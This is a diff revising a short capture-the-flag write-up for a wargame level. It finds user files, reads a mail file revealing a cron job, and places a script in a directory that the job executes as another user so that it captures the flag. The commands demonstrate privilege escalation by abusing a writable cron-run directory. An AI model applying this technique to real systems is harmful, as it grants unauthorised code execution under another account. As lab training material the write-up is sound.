@@ -1,13 +1,13 @@
-# Check all files named after our user
-`find / -name "*level05" 2>/dev/null`
+# Level05
 
-# Check our mail and find the crontab
-`cat /var/mail/level05`
+Let's find all files named after our user.
+>`find / -name "*level05" 2>/dev/null`
 
-# Check the script
-`cat /usr/sbin/openarenaserver`
+In `/var/mail/level05` we can find a cron job which executes `/usr/sbin/openarenaserver` as flag05 every 2 minutes.
+`/usr/sbin/openarenaserver` is a script which executes every script inside `/opt/openarenaserver` and delete them.
 
-# Create a custom script to run getflag as flag05
-`echo "/bin/getflag > /tmp/hack" > /opt/openarenaserver/hack`
+We'll create our own script inside `/opt/openarenaserver`.
+>`echo '/bin/getflag > /tmp/flag' > /opt/openarenaserver/getflag`
 
-# Wait for the scitp to execute and get the flag
+Get the flag.
+>`cat /tmp/flag`
